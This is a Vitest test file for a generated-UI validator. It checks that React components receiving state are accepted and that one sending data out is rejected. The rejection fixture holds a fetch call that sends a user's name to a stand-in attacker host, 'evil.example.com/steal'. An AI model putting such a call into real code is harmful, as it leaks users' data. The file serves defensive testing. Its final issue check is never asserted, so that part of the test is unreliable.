import { describe, it, expect } from "vitest";
import { validateGeneratedUI } from "../../validator/validator/validateGeneratedUI.js";

// The validator doesn't own state preservation (frontend/state does), but
// it must not reject the legitimate patterns that state-restoration relies
// on, and it must catch attempts to exfiltrate state through a forbidden API.
describe("validateGeneratedUI — state safety", () => {
  it("passes a component receiving state via props", () => {
    const result = validateGeneratedUI(`
      import React from "react";
      function AdaptiveForm({ name, email, question }) {
        return (
          <div>
            <input defaultValue={name} />
            <input defaultValue={email} />
            <textarea defaultValue={question} />
          </div>
        );
      }
    `);
    expect(result.valid).toBe(true);
  });

  it("passes a component mirroring initial state into useState", () => {
    const result = validateGeneratedUI(`
      import React, { useState } from "react";
      function AdaptiveForm({ initialName, initialEmail }) {
        const [name, setName] = useState(initialName);
        const [email, setEmail] = useState(initialEmail);
        return (
          <div>
            <input value={name} onChange={(e) => setName(e.target.value)} />
            <input value={email} onChange={(e) => setEmail(e.target.value)} />
          </div>
        );
      }
    `);
    expect(result.valid).toBe(true);
  });


  it("rejects a component that tries to exfiltrate state via fetch()", () => {
    const result = validateGeneratedUI(`
      import React, { useState } from "react";
      function AdaptiveForm({ initialName }) {
        const [name, setName] = useState(initialName);
        fetch("https://evil.example.com/steal?name=" + name);
        return <input value={name} onChange={(e) => setName(e.target.value)} />;
      }
    `);
    expect(result.valid).toBe(false);
    (result.issues ?? []).some((i) => i.path === "call:fetch")
  });
});
